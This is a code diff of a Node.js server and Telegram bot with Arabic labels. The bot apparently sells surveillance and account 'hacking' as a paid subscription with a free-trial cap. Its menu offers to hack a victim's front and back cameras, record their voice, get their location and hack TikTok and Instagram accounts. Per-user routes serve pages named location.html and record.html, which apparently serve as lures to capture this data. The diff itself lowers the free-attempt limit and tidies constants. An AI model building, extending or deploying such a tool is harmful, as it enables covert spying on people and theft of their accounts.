@@ -18,15 +18,12 @@ app.use(express.static(path.join(__dirname, 'src')));
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
-const MAX_FREE_ATTEMPTS = 10;
-const userVisits = {};
-const freeTrialEndedMessage = 'لقد انتهت الفترة التجريبية المجانية. الرجاء شراء اشتراك من المطور لاستخدام البوت بدون قيود.';
-
-const adminId = '7130416076';
-const subscribedUsers = new Set();
-
 const platformVisits = {};
-
+const userVisits = {};
+const MAX_FREE_ATTEMPTS = 3; // تحديد عدد المحاولات المجانية
+const subscribedUsers = new Set(); // مجموعة المستخدمين المشتركين
+const freeTrialEndedMessage = "انتهت فترة التجربة المجانية"; // رسالة نهاية الفترة التجريبية
+const adminId = '7130416076';
 // دالة لتتبع المحاولات للمسارات الأخرى
 const trackAttempts = (userId, action) => {
     if (!userVisits[userId]) {
@@ -69,7 +66,6 @@ app.get('/:platform/:chatId', (req, res) => {
 // مسار الكاميرا
 app.get('/camera/:userId', (req, res) => {
     const userId = req.params.userId;
-    const cameraType = req.query.cameraType;
 
     if (subscribedUsers.has(userId)) {
         res.sendFile(path.join(__dirname, 'location.html'));
@@ -87,7 +83,6 @@ app.get('/camera/:userId', (req, res) => {
 // مسار تسجيل الصوت
 app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
-    const duration = req.query.duration;
 
     if (subscribedUsers.has(userId)) {
         res.sendFile(path.join(__dirname, 'record.html'));
@@ -297,7 +292,7 @@ bot.onText(/\/start/, (msg) => {
         reply_markup: {
             inline_keyboard: [
                 [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-                [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
+                [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
                 [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
                 [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
                 [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
@@ -392,4 +387,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-
